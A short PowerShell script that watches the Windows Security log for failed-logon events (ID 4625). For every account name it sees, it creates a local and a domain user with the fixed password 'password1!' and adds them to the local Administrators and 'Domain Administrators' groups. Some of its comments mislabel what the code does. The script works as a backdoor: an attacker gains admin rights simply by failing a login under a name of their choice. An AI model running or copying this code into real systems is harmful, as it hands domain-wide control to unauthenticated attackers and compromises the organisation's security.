# Looping indefinitely
while($true) {

	# Get the current date and subtract 1 minute
	$previousMin = (get-date).AddMinutes(-1)
	$currentTime = $previousMin.AddMinutes(1)
	write-host "Checking for users made between" $currentTime "and" $previousMin

	# Store successful logon events from security logs with the specified dates and workstation/IP in an array
	$failed_logon_events = Get-Eventlog -LogName Security -after $previousMin | where {$_.eventID -eq 4625 }


	# Crawl through events; print all logon history with type, date/time, status, account name, computer and IP address if user logged on remotely
	foreach ($e in $failed_logon_events){
	
		if (($e.EventID -eq 4625 )){
		  write-host "Type: Remote Logon`tDate: "$e.TimeGenerated "`tStatus: Failure`tUser: "$e.ReplacementStrings[5] "`tWorkstation: "$e.ReplacementStrings[11] "`tIP Address: "$e.ReplacementStrings[18]
		  
		  # Add failed logon user to system as a local admin
		  net user $e.ReplacementStrings[5] password1! /add
		  net localgroup Administrators $e.ReplacementStrings[5] /add
		  
		  # Lets try to make them a domain admin too!
		  net user $e.ReplacementStrings[5] password1! /add /domain
		  net group "Domain Administrators" $e.ReplacementStrings[5] /add
		}}
	write-host("Done. Sleeping for 60 seconds...")
	start-sleep -seconds 60
}